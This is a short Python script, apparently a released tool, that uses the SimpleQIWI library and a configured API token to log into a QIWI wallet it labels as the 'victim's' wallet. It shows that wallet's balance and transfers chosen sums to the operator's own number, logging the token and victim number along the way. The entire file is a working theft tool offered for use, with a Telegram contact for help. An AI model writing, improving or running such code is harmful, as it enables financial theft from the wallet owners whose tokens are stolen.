"""

ᕦ(ò_óˇ)ᕤ

QIWI 1.0 beta release
by dokky
tg: @dokky_work

"""

import os
import time
import logging
import colorama
from colorama import Fore, Back
from SimpleQIWI import *
from config import number, qiwi, token

class Interface:
	def mainMenu():
		global api
		colorama.init()
		print(Fore.CYAN +  'Welcome!')
		time.sleep(1)
		print('\n')
		print('Ваш конфиг: ')
		print('\n')
		print(Fore.MAGENTA+ '[1] Ваш Qiwi: ' + number)
		print('[2] Qiwi жертвы: ' + qiwi)
		print('[3] Токен: ' + token)
		api = QApi(token = token, phone = qiwi)
		t = time.strftime('%Y-%m-%d-%H:%M')
		logging.basicConfig(level='INFO', filename =t + '.log', filemode ='w', format='%(name)s - %(levelname)s - %(message)s')
		time.sleep(1)
		print('\n')
		print(Fore.MAGENTA + '[!] Введите help - для показа команд')
		while True:
			coml = str(input(Fore.CYAN + '>> '))
			if coml == 'help':
				Actions.help()
			elif coml == 'balance':
				Actions.balance()
			elif coml == 'pay':
				Actions.pay()
			else:
				print('Команда не найдена. Введите help чтобы показать команды.')			


class Actions:
	def help():
		print('Список доступных команд: ')
		print('\n')
		print(Fore.MAGENTA + 'help - отображение команд')
		print('balance - показать баланс')
		print('pay - перевод')
		print('\n')
	def pay():
		print('[+] Введите сумму перевода:')
		sum = str(input('>> '))
		try:
			api.pay(number, sum)
			print(Fore.GREEN + '[√] Успешно!')
			logging.info('pay ok' + ':' + sum + ':' + token + ':' + qiwi)
		except:
			print(Fore.RED + '[X] Что то пошло не так.. Попробуйте позже.')
			print(Fore.RED + '[?] Если все еще не получается, напишите в tg: @dokky_work')
			logging.info('pay err' + ':' + sum + ':' + token + ':' + qiwi)
	def balance():
		print('\n')
		print('[+] Баланс кошелька: ')
		print(Fore.MAGENTA + api.balance)
		print('\n')
		
		
Interface.mainMenu()